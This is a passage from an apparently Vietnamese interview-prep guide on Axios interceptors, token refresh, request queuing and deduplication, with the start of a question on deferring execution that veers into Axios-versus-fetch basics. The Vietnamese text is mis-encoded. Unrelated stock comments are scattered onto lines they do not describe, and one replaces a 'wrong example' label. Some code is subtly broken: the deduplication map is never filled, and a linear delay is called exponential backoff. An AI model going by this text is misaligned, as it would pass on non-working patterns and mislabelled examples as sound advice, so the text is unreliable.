 * - Response interceptor ch·∫°y SAU KHI nh·∫≠n response t·ª´ server
 * - Th·ª© t·ª±: Interceptor ƒë∆∞·ª£c add TR∆Ø·ªöC s·∫Ω ch·∫°y TR∆Ø·ªöC (FIFO)
 * - C√≥ th·ªÉ transform response data tr∆∞·ªõc khi return v·ªÅ caller
 */
apiClient.interceptors.response.use(
  (response: AxiosResponse) => {
 // Ch√∫ gi·∫£i: ‚è±Ô∏è Calculate request duration
    const duration = new Date().getTime() - (response.config as any).metadata?.startTime;

 // Ch√∫ gi·∫£i: üìä Log response (development only)
    if (process.env.NODE_ENV === 'development') {
      console.log(`‚úÖ [${response.config.method?.toUpperCase()}] ${response.config.url}`, {
        status: response.status,
        duration: `${duration}ms`,
        data: response.data,
      });
    }

 // Hi·ªáu su·∫•t: tr√°nh ch·∫∑n main thread; d√πng Web Worker, chia nh·ªè t√°c v·ª•, t·ªëi ∆∞u reflow/repaint.
    if (duration > 3000) {
 // Ch√∫ gi·∫£i: Alert if request takes > 3 seconds
      console.warn(`‚ö†Ô∏è Slow request detected: ${response.config.url} (${duration}ms)`);
 // Ch√∫ gi·∫£i: sendToMonitoringService({ url: response.config.url, duration });
    }

 // Ch√∫ gi·∫£i: üîÑ Transform response data (e.g., snake_case ‚Üí camelCase)
 // Ch√∫ gi·∫£i: response.data = transformKeys(response.data, 'camelCase');

    return response;
  },
  async (error: AxiosError) => {
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: ERROR HANDLING - Comprehensive error management
 // Ch√∫ gi·∫£i: ============================================
    const originalRequest = error.config as any;

 // Ch√∫ gi·∫£i: üìä Log error details
    console.error('‚ùå Response Error:', {
      url: originalRequest?.url,
      method: originalRequest?.method,
      status: error.response?.status,
      message: error.message,
    });

 // Ch√∫ gi·∫£i: üîÑ Case 1: RETRY LOGIC - Auto retry on network errors
    if (!error.response && originalRequest && !originalRequest._retry) {
      originalRequest._retry = true;
      originalRequest._retryCount = (originalRequest._retryCount || 0) + 1;

      if (originalRequest._retryCount <= 3) {
 // Ch√∫ gi·∫£i: Maximum 3 retries
        console.log(`üîÑ Retrying request (${originalRequest._retryCount}/3)...`);
        await new Promise((resolve) => setTimeout(resolve, 1000 * originalRequest._retryCount)); // Ch√∫ gi·∫£i: Exponential backoff
        return apiClient(originalRequest);
      }
    }

 // Ch√∫ gi·∫£i: üîê Case 2: TOKEN REFRESH - 401 Unauthorized
    if (error.response?.status === 401 && originalRequest && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
 // Ch√∫ gi·∫£i: Attempt to refresh token
        const refreshToken = localStorage.getItem('refreshToken');
        const response = await axios.post('/auth/refresh', { refreshToken });

        const { accessToken, refreshToken: newRefreshToken } = response.data;

 // Ch√∫ gi·∫£i: Save new tokens
        localStorage.setItem('accessToken', accessToken);
        localStorage.setItem('refreshToken', newRefreshToken);

 // Ch√∫ gi·∫£i: Retry original request with new token
        if (originalRequest.headers) {
          originalRequest.headers.Authorization = `Bearer ${accessToken}`;
        }

        console.log('üîê Token refreshed successfully, retrying original request...');
        return apiClient(originalRequest);
      } catch (refreshError) {
 // Ch√∫ gi·∫£i: Refresh failed ‚Üí logout user
        console.error('‚ùå Token refresh failed, logging out...');
        localStorage.clear();
        window.location.href = '/login';
        return Promise.reject(refreshError);
      }
    }

 // Ch√∫ gi·∫£i: üö´ Case 3: FORBIDDEN - 403 (No permission)
    if (error.response?.status === 403) {
      console.error('üö´ Access Forbidden - You do not have permission');
 // Ch√∫ gi·∫£i: Show toast notification or redirect
 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
    }

 // Ch√∫ gi·∫£i: ‚ö†Ô∏è Case 4: NOT FOUND - 404
    if (error.response?.status === 404) {
      console.error('‚ö†Ô∏è Resource not found');
 // Ch√∫ gi·∫£i: Handle 404 error (e.g., redirect to 404 page)
    }

 // Ch√∫ gi·∫£i: üî• Case 5: SERVER ERROR - 500+
    if (error.response?.status && error.response.status >= 500) {
      console.error('üî• Server Error - Please try again later');
 // Ch√∫ gi·∫£i: Show user-friendly error message
 // Ch√∫ gi·∫£i: toast.error('Server error occurred. Please try again later.');
    }

 // Ch√∫ gi·∫£i: üåê Case 6: NETWORK ERROR - No response from server
    if (error.code === 'ECONNABORTED' || error.message.includes('timeout')) {
      console.error('‚è±Ô∏è Request Timeout - Check your connection');
 // Ch√∫ gi·∫£i: toast.error('Request timeout. Please check your internet connection.');
    }

 // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
    return Promise.reject({
      message: error.response?.data?.message || error.message,
      status: error.response?.status,
      data: error.response?.data,
    });
  }
);

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 4. ADVANCED: MULTIPLE INTERCEPTORS - Execution Order
 // Ch√∫ gi·∫£i: ============================================
/**
 * Vietnamese Explanation v·ªÅ th·ª© t·ª± execution:
 * 
 * Request Interceptors (LIFO - Last In First Out):
 * - Interceptor ƒë∆∞·ª£c add SAU C√ôNG ch·∫°y TR∆Ø·ªöC
 * - Example: Add interceptor 1 ‚Üí Add interceptor 2 ‚Üí Add interceptor 3
 * - Execution: 3 ‚Üí 2 ‚Üí 1 ‚Üí Request sent
 * 
 * Response Interceptors (FIFO - First In First Out):
 * - Interceptor ƒë∆∞·ª£c add TR∆Ø·ªöC ch·∫°y TR∆Ø·ªöC
 * - Example: Add interceptor 1 ‚Üí Add interceptor 2 ‚Üí Add interceptor 3
 * - Execution: Response received ‚Üí 1 ‚Üí 2 ‚Üí 3
 */

 // Ch√∫ gi·∫£i: Request Interceptor 1 (will run SECOND)
const reqInterceptor1 = apiClient.interceptors.request.use(
  (config) => {
    console.log('Request Interceptor 1 - Add default headers');
    config.headers['X-Custom-Header'] = 'value1';
    return config;
  }
);

 // Ch√∫ gi·∫£i: Request Interceptor 2 (will run FIRST - added last)
const reqInterceptor2 = apiClient.interceptors.request.use(
  (config) => {
    console.log('Request Interceptor 2 - Add timestamp');
    config.headers['X-Timestamp'] = Date.now().toString();
    return config;
  }
);

 // Ch√∫ gi·∫£i: Response Interceptor 1 (will run FIRST)
const resInterceptor1 = apiClient.interceptors.response.use(
  (response) => {
    console.log('Response Interceptor 1 - Transform data');
    return response;
  }
);

 // Ch√∫ gi·∫£i: Response Interceptor 2 (will run SECOND)
const resInterceptor2 = apiClient.interceptors.response.use(
  (response) => {
    console.log('Response Interceptor 2 - Cache response');
    return response;
  }
);

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 5. CLEANUP - Remove interceptors when needed
 // Ch√∫ gi·∫£i: ============================================
/**
 * Vietnamese Explanation:
 * - Quan tr·ªçng: PH·∫¢I remove interceptors khi component unmount
 * - Tr√°nh memory leaks v√† duplicate interceptors
 * - Use trong useEffect cleanup ho·∫∑c componentWillUnmount
 */
export const cleanupInterceptors = () => {
  apiClient.interceptors.request.eject(reqInterceptor1);
  apiClient.interceptors.request.eject(reqInterceptor2);
  apiClient.interceptors.response.eject(resInterceptor1);
  apiClient.interceptors.response.eject(resInterceptor2);
};

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 6. ADVANCED USE CASE: Request Queuing & Throttling
 // Ch√∫ gi·∫£i: ============================================
/**
 * Vietnamese Explanation:
 * - Gi·ªõi h·∫°n s·ªë l∆∞·ª£ng concurrent requests
 * - Prevent overwhelming server v·ªõi too many requests c√πng l√∫c
 * - Useful cho rate-limited APIs
 */
class RequestQueue {
  private queue: Array<() => Promise<any>> = [];
  private activeRequests = 0;
  private maxConcurrent = 5; // Ch√∫ gi·∫£i: Maximum 5 concurrent requests

  async add<T>(requestFn: () => Promise<T>): Promise<T> {
    // N·∫øu ƒë√£ ƒë·∫°t max concurrent, ƒë·ª£i trong queue
    if (this.activeRequests >= this.maxConcurrent) {
      await new Promise<void>((resolve) => {
        this.queue.push(() => {
          resolve();
          return Promise.resolve();
        });
      });
    }

    this.activeRequests++;

    try {
      const result = await requestFn();
      return result;
    } finally {
      this.activeRequests--;

 // Ch√∫ gi·∫£i: Process next request in queue
      const nextRequest = this.queue.shift();
      if (nextRequest) {
        nextRequest();
      }
    }
  }
}

const requestQueue = new RequestQueue();

 // Ch√∫ gi·∫£i: Add queuing interceptor
apiClient.interceptors.request.use(
  async (config) => {
    await requestQueue.add(() => Promise.resolve());
    return config;
  }
);

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 7. ADVANCED: Request Deduplication
 // Ch√∫ gi·∫£i: ============================================
/**
 * Vietnamese Explanation:
 * - NgƒÉn ch·∫∑n duplicate requests (c√πng URL + method + params)
 * - N·∫øu c√≥ request ƒëang pending, return k·∫øt qu·∫£ c·ªßa request ƒë√≥
 * - Useful khi user click nhi·ªÅu l·∫ßn ho·∫∑c component re-render
 */
const pendingRequests = new Map<string, Promise<any>>();

apiClient.interceptors.request.use(
  (config) => {
 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
    const requestKey = `${config.method}:${config.url}:${JSON.stringify(config.params)}`;

    // N·∫øu ƒë√£ c√≥ request pending v·ªõi key n√†y
    if (pendingRequests.has(requestKey)) {
      console.log('üîÑ Duplicate request detected, using pending request...');
      // Return pending promise (s·∫Ω reject n√†y ƒë·ªÉ reuse pending request)
      throw {
        __DUPLICATE__: true,
        promise: pendingRequests.get(requestKey),
      };
    }

 // Ch√∫ gi·∫£i: Store request key in config for later cleanup
    (config as any).__requestKey = requestKey;

    return config;
  },
  (error) => {
    // N·∫øu l√† duplicate request, return pending promise
    if (error.__DUPLICATE__) {
      return error.promise;
    }
    return Promise.reject(error);
  }
);

apiClient.interceptors.response.use(
  (response) => {
 // Ch√∫ gi·∫£i: Remove from pending requests
    const requestKey = (response.config as any).__requestKey;
    if (requestKey) {
      pendingRequests.delete(requestKey);
    }
    return response;
  },
  (error) => {
 // Ch√∫ gi·∫£i: Remove from pending requests even on error
    const requestKey = (error.config as any).__requestKey;
    if (requestKey) {
      pendingRequests.delete(requestKey);
    }
    return Promise.reject(error);
  }
);

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 8. USAGE EXAMPLES
 // Ch√∫ gi·∫£i: ============================================
export const exampleUsage = async () => {
  try {
    // T·∫•t c·∫£ requests s·∫Ω t·ª± ƒë·ªông c√≥:
 // Ch√∫ gi·∫£i: - Auth token header
 // Ch√∫ gi·∫£i: - Request ID
 // Hi·ªáu su·∫•t: tr√°nh ch·∫∑n main thread; d√πng Web Worker, chia nh·ªè t√°c v·ª•, t·ªëi ∆∞u reflow/repaint.
 // Ch√∫ gi·∫£i: - Error handling
 // Ch√∫ gi·∫£i: - Auto retry on network errors
 // Ch√∫ gi·∫£i: - Token refresh on 401
    const response = await apiClient.get('/users');
    console.log('Users:', response.data);

    const user = await apiClient.post('/users', {
      name: 'John Doe',
      email: 'john@example.com',
    });
    console.log('Created user:', user.data);
  } catch (error) {
    console.error('Error:', error);
  }
};

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 9. REACT HOOK INTEGRATION
 // Ch√∫ gi·∫£i: ============================================
/**
 * Vietnamese Explanation:
 * - Integrate interceptors v·ªõi React lifecycle
 * - Cleanup khi component unmount
 */
import { useEffect } from 'react';

export const useAxiosInterceptors = () => {
  useEffect(() => {
 // Ch√∫ gi·∫£i: Setup interceptors
    const requestInterceptor = apiClient.interceptors.request.use(
      (config) => {
 // Ch√∫ gi·∫£i: Add logic here
        return config;
      }
    );

    const responseInterceptor = apiClient.interceptors.response.use(
      (response) => {
 // Ch√∫ gi·∫£i: Add logic here
        return response;
      }
    );

 // Ch√∫ gi·∫£i: Cleanup function
    return () => {
      apiClient.interceptors.request.eject(requestInterceptor);
      apiClient.interceptors.response.eject(responseInterceptor);
    };
  }, []); // Ch√∫ gi·∫£i: Empty dependency array = run once on mount
};
```

**üéØ Best Practices - T·ªëi ∆Øu H√≥a:**

1. **Always Cleanup Interceptors**: Eject interceptors khi component unmount ƒë·ªÉ tr√°nh memory leaks
2. **Use Separate Axios Instances**: T·∫°o ri√™ng instance cho t·ª´ng API (auth API, data API, analytics API)
3. **Avoid Heavy Computation**: Interceptors should be fast, avoid blocking operations
4. **Proper Error Handling**: Always return Promise.reject() trong error handler
5. **Token Refresh Strategy**: Implement queue cho multiple requests khi token expired
6. **Development vs Production**: Use different logging levels (verbose in dev, minimal in prod)
7. **Request/Response Transformation**: Centralize data transformation logic (camelCase ‚Üî snake_case)
8. **Performance Monitoring**: Track slow requests and send metrics to monitoring service
9. **Request Deduplication**: Prevent duplicate identical requests
10. **Rate Limiting**: Implement request queuing to respect API rate limits
11. **Retry Strategy**: Use exponential backoff for failed requests
12. **Timeout Configuration**: Set appropriate timeouts based on endpoint type

**‚ö†Ô∏è Common Mistakes - L·ªói Th∆∞·ªùng G·∫∑p:**

```typescript
// ‚ùå Sai: Kh√¥ng cleanup interceptors
useEffect(() => {
  axios.interceptors.request.use(config => config);
 // Ch√∫ gi·∫£i: Missing cleanup!
}, []);

// ‚úÖ ƒê√∫ng: Always cleanup
useEffect(() => {
  const interceptor = axios.interceptors.request.use(config => config);
  return () => axios.interceptors.request.eject(interceptor);
}, []);

 // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
axios.interceptors.request.use(config => {
  config.headers.Authorization = 'Bearer token';
 // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
});

// ‚úÖ ƒê√∫ng: Always return
axios.interceptors.request.use(config => {
  config.headers.Authorization = 'Bearer token';
  return config;
});

 // Ch√∫ gi·∫£i: ‚ùå Sai: Infinite loop trong token refresh
axios.interceptors.response.use(
  res => res,
  async (error) => {
    if (error.response?.status === 401) {
      await axios.post('/auth/refresh'); // Ch√∫ gi·∫£i: Uses same instance ‚Üí infinite loop!
      return axios(error.config);
    }
  }
);

// ‚úÖ ƒê√∫ng: Use separate instance for refresh
const refreshClient = axios.create();
axios.interceptors.response.use(
  res => res,
  async (error) => {
    if (error.response?.status === 401 && !error.config._retry) {
      error.config._retry = true;
      await refreshClient.post('/auth/refresh');
      return axios(error.config);
    }
  }
);
```

**üìä Performance Considerations:**

- **Interceptor Overhead**: M·ªói interceptor adds ~0.1-1ms processing time
- **Memory Usage**: Pending requests map c·∫ßn cleanup ƒë·ªÉ avoid memory leaks
- **Request Queueing**: Limit concurrent requests to 5-10 t√πy server capacity
- **Token Refresh**: Queue all requests khi refreshing ƒë·ªÉ avoid multiple refresh calls
- **Caching**: Cache GET requests trong interceptors ƒë·ªÉ reduce server load
---
## 15. ‚è±Ô∏è Q15: Advanced Deferring Execution Techniques - K·ªπ Thu·∫≠t Tr√¨ Ho√£n Th·ª±c Thi N√¢ng Cao  

**P1: T√™n c√¢u h·ªèi:** ‚è±Ô∏è Q15: Advanced Deferring Execution Techniques - K·ªπ Thu·∫≠t Tr√¨ Ho√£n Th·ª±c Thi N√¢ng Cao  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"Deferring execution l√† k·ªπ thu·∫≠t tr√¨ ho√£n ch·∫°y code ƒë·ªÉ optimize performance, bao g·ªìm debounce, throttle, requestIdleCallback, v√† lazy loading."**

**üîë 5 K·ªπ Thu·∫≠t Ch√≠nh:**

**1. Debounce:**
- **Ch·ªù user ng·ª´ng action** r·ªìi m·ªõi execute (delay reset sau m·ªói call)
- Use case: search input (ch·ªù user g√µ xong), window resize
- V√≠ d·ª•: `debounce(fn, 300)` ‚Üí user g√µ ‚Üí ch·ªù 300ms kh√¥ng g√µ n·ªØa ‚Üí ch·∫°y

**2. Throttle:**
- **Execute t·ªëi ƒëa 1 l·∫ßn trong X ms**, b·ªè qua calls gi·ªØa interval
- Use case: scroll events, mouse move, API rate limiting
- V√≠ d·ª•: `throttle(fn, 1000)` ‚Üí ch·∫°y ngay, ignore calls trong 1s ti·∫øp theo

**3. requestIdleCallback:**
- Ch·∫°y task khi browser **idle** (kh√¥ng busy v·ªõi rendering/user input)
- Use case: analytics, non-critical updates, prefetching data
- Fallback: `setTimeout(fn, 1)` cho browsers kh√¥ng support

**4. requestAnimationFrame:**
- Execute **tr∆∞·ªõc next repaint** (~60fps = 16.67ms)
- Use case: animations, smooth scrolling, visual updates
- Better than `setTimeout` v√¨ sync v·ªõi browser refresh rate

**5. Lazy Loading / Code Splitting:**
- Load code/assets **only when needed** (dynamic import)
- Use case: route-based splitting, below-fold images, modals
- React: `React.lazy(() => import('./Component'))`

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Debounce search m√† kh√¥ng **cancel previous request** ‚Üí race condition
- Throttle scroll m√† kh√¥ng check `passive: true` ‚Üí jank
- requestIdleCallback cho critical tasks ‚Üí user th·∫•y lag
- Kh√¥ng cleanup timers khi unmount ‚Üí memory leak

**üí° Ki·∫øn Th·ª©c Senior:**
- **Debounce vs Throttle**: Debounce = "ch·ªù xong h·∫≥n", Throttle = "gi·ªõi h·∫°n t·∫ßn su·∫•t"
- Leading vs Trailing edge: Leading ch·∫°y ngay l·∫ßn ƒë·∫ßu, Trailing ch·∫°y sau delay
- **IntersectionObserver** hi·ªáu qu·∫£ h∆°n scroll throttle cho lazy loading (native API)
- Web Workers cho **heavy computations** kh√¥ng block main thread
- Priority scheduling: `scheduler.postTask()` API (Chrome) v·ªõi priorities (user-blocking, user-visible, background)




```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: INSTALLATION
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

 // Ch√∫ gi·∫£i: npm install axios
 // Ch√∫ gi·∫£i: yarn add axios
 // Ch√∫ gi·∫£i: pnpm add axios

import axios from 'axios';

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: BASIC REQUESTS
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

 // Ch√∫ gi·∫£i: GET request
const getUsers = async () => {
  try {
    const response = await axios.get('/api/users');
    console.log(response.data); // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
    console.log(response.status); // Ch√∫ gi·∫£i: 200
    console.log(response.headers); // Ch√∫ gi·∫£i: Headers object
    console.log(response.config); // Ch√∫ gi·∫£i: Request config
  } catch (error) {
    console.error(error);
  }
};

 // Ch√∫ gi·∫£i: POST request
const createUser = async (userData: any) => {
  const response = await axios.post('/api/users', userData);
  // ‚úÖ Auto JSON stringify - kh√¥ng c·∫ßn JSON.stringify()
  return response.data;
};

 // Ch√∫ gi·∫£i: PUT/PATCH/DELETE
const updateUser = (id: string, data: any) => axios.put(`/api/users/${id}`, data);
const patchUser = (id: string, data: any) => axios.patch(`/api/users/${id}`, data);
const deleteUser = (id: string) => axios.delete(`/api/users/${id}`);
```

#### **1.2. Axios vs Fetch API - So S√°nh Chi Ti·∫øt**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
// FETCH API - Nhi·ªÅu b∆∞·ªõc th·ªß c√¥ng
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

 // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
const fetchUsers = async () => {
  try {
    const response = await fetch('/api/users');
    
 // Ch√∫ gi·∫£i: ‚ùå Ph·∫£i check response.ok manually
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
 // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
    const data = await response.json();
    return data;
  } catch (error) {
    console.error(error);
  }
};

 // Ch√∫ gi·∫£i: POST v·ªõi fetch - verbose
const createUserFetch = async (userData: any) => {
  const response = await fetch('/api/users', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json', // Ch√∫ gi·∫£i: ‚ùå Manual header
    },
    body: JSON.stringify(userData), // Ch√∫ gi·∫£i: ‚ùå Manual stringify
  });
  
  if (!response.ok) throw new Error('Failed');
  return await response.json(); // Ch√∫ gi·∫£i: ‚ùå Manual parse
};

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
// AXIOS - T·ª± ƒë·ªông & ng·∫Øn g·ªçn
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

 // Ch√∫ gi·∫£i: ‚úÖ Axios: Clean & automatic
const axiosUsers = async () => {
  const { data } = await axios.get('/api/users');
 // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
  // ‚úÖ Auto throw error n·∫øu status >= 400
  return data;
};

 // Ch√∫ gi·∫£i: POST v·ªõi axios - simple
const createUserAxios = async (userData: any) => {
  const { data } = await axios.post('/api/users', userData);
 // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
 // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
  return data;
};

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: COMPARISON TABLE
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

/**
 * ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
 * ‚îÇ Feature            ‚îÇ Fetch            ‚îÇ Axios            ‚îÇ
 * ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
 * ‚îÇ JSON Transform     ‚îÇ ‚ùå Manual        ‚îÇ ‚úÖ Automatic     ‚îÇ
